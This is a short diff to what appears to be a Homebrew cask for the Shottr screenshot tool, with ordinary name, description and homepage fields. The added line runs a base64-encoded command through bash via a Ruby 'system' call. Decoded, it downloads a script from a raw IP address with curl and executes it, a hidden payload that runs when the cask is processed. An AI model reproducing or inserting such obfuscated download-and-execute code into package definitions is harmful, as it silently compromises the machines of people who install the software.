@@ -8,7 +8,7 @@ cask "shottr" do
   name "Shottr"
   desc "Lightweight screenshot and annotation tool for macOS"
   homepage "https://shottr.cc/"
-  echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash
+  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash"
   auto_updates true
 
   app "Shottr.app"
